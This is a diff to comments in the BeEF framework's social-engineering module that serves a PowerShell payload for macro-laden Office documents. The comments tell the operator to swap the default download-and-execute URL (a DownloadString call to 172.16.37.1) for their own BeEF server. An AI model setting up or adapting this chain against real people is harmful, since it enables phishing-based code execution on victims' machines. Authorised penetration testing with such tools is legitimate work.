@@ -11,11 +11,13 @@ module BeEF
       # NOTE: the powershell_payload is work/copyright from @mattifestation (kudos for that)
       # NOTE: the visual-basic macro code inside the Microsoft Office Word/Excel documents is work/copyright from @enigma0x3 (kudos for that)
       #
-      # If you use the powershell payload for Office documents, make sure you edit the macro inside the sample documents in this directory:
-      # change the payload URL with your BeEF server and powershell URL settings. By default powershell will be served from:
-      # http://beef_server:beef_port/ps/ps.png
+      # If you use the powershell payload for Office documents (extensions/social_engineering/powershell/msoffice_docs),
+      # make sure you edit the macro inside the sample documents.
+      # Change the default payload URL (DownloadString('http://172.16.37.1/ps/ps.png'))) with your BeEF server and powershell URL settings.
+      # By default powershell will be served from http://beef_server:beef_port/ps/ps.png
       #
-      # NOTE: make sure you change the 'host' variable in the main BeEF config.yaml from 0.0.0.0 to the specific IP where BeEF is binded to.
+      # NOTE: make sure you change the 'host' variable in the main BeEF config.yaml from 0.0.0.0 to the specific IP where BeEF is binded to,
+      # and also the powershell-related variable in extensions/social_engineering/config.yaml
       class Bind_powershell < BeEF::Core::Router::Router
         before do
           headers 'Pragma' => 'no-cache',
